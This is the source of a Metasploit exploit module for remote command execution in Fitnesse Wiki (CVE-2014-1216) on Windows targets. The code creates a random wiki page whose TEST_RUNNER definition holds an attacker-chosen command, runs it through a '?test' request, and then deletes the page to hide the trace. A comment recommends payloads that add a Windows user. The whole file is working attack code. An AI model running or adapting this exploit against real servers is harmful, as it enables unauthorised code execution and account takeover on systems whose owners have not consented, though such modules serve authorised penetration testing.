##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Fitnesse Wiki Remote Command Execution',
      'Description'    => %q{
        This module exploits a vulnerability found in Fitnesse Wiki, version 20140201
        and earlier.
      },
      'Author'         =>
        [
          'Jerzy Kramarz',  ## Vulnerability discovery
          'Veerendra G.G <veerendragg {at} secpod.com>', ## Metasploit Module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2014-1216' ],
          [ 'OSVDB', '103907' ],
          [ 'BID', '65921' ],
          [ 'URL', 'http://secpod.org/blog/?p=2311' ],
          [ 'URL', 'http://secpod.org/msf/fitnesse_wiki_rce.rb' ],
          [ 'URL', 'http://seclists.org/fulldisclosure/2014/Mar/1' ],
          [ 'URL', 'https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-1216/' ]
        ],
 
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'    => 1000,
          'BadChars' => "",
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd', ##
              ##'RequiredCmd'  => 'generic telnet',
              ## payloads cmd/windows/adduser and cmd/windows/generic works perfectly
            }
        },
      'Platform'       => %w{ win },
      'Arch'           => ARCH_CMD,
      'Targets'        =>
        [
          ['Windows', { 'Platform' => 'win' } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Feb 25 2014'))
 
    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [true, 'Fitnesse Wiki base path', '/'])
      ], self.class)
  end
 
  def check
    print_status("#{peer} - Trying to detect Fitnesse Wiki")
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path)
    })
 
    if res && res.code == 200 && res.body.include?(">FitNesse<")
      print_good("#{peer} - FitNesse Wiki Detected!")
      return Exploit::CheckCode::Detected
    end
 
    return Exploit::CheckCode::Safe
  end
 
  def http_send_command(command)
 
    ## Construct random page in WikiWord format
    uri = normalize_uri(target_uri.path, 'TestP' + rand_text_alpha_lower(7))
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => uri + "?edit"
    })
 
    if !res || res.code != 200
      fail_with(Failure::Unknown, "#{peer} - Unexpected response, exploit probably failed!")
    end
 
    print_status("#{peer} - Retrieving edit time and ticket id")
 
    ## Get Edit Time and Ticket Id from the response
    res.body =~ /"editTime" value="((\d)+)"/
    edit_time = $1
 
    res.body =~ /"ticketId" value="((-?\d)+)"/
    ticket_id = $1
 
    ## Validate we are able to extract Edit Time and Ticket Id
    if !edit_time or !ticket_id
      print_error("#{peer} - Failed to get Ticket Id / Edit Time.")
      return
    end
 
    print_status("#{peer} - Attempting to create '#{uri}'")
 
    ## Construct Referer
    referer = "http://#{rhost}:#{rport}" + uri + "?edit"
 
    ## Construct command to be executed
    page_content = '!define COMMAND_PATTERN {%m}
!define TEST_RUNNER {' + command + '}'
 
    print_status("#{peer} - Injecting the payload")
    ## Construct POST request to create page with malicious commands
    ## inserted in the page
    res = send_request_cgi(
    {
      'uri'     => uri,
      'method'  => 'POST',
      'headers' => {'Referer' => referer},
      'vars_post' =>
        {
          'editTime' => edit_time,
          'ticketId' => ticket_id,
          'responder' => 'saveData',
          'helpText' => '',
          'suites' => '',
          '__EDITOR__1' => 'textarea',
          'pageContent' => page_content,
          'save' => 'Save',
        }
    })
 
    if res && res.code == 303
      print_status("#{peer} - Successfully created '#{uri}' with payload")
    end
 
    ## Execute inserted command
    print_status("#{peer} - Sending exploit request")
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => uri + "?test"
    })
 
    if res && res.code == 200
      print_status("#{peer} - Successfully sent exploit request")
    end
 
    ## Cleanup by deleting the created page
    print_status("#{peer} - Execting cleanup routine")
    referer = "http://#{rhost}:#{rport}" + uri + "?deletePage"
    res = send_request_cgi(
    {
      'uri'     => uri + "?deletePage",
      'method'  => 'POST',
      'headers' => {'Referer' => referer},
      'vars_post' =>
        {
          'confirmed' => 'Yes',
        }
    })
  end
 
  def exploit
    http_send_command(payload.encoded)
  end
end
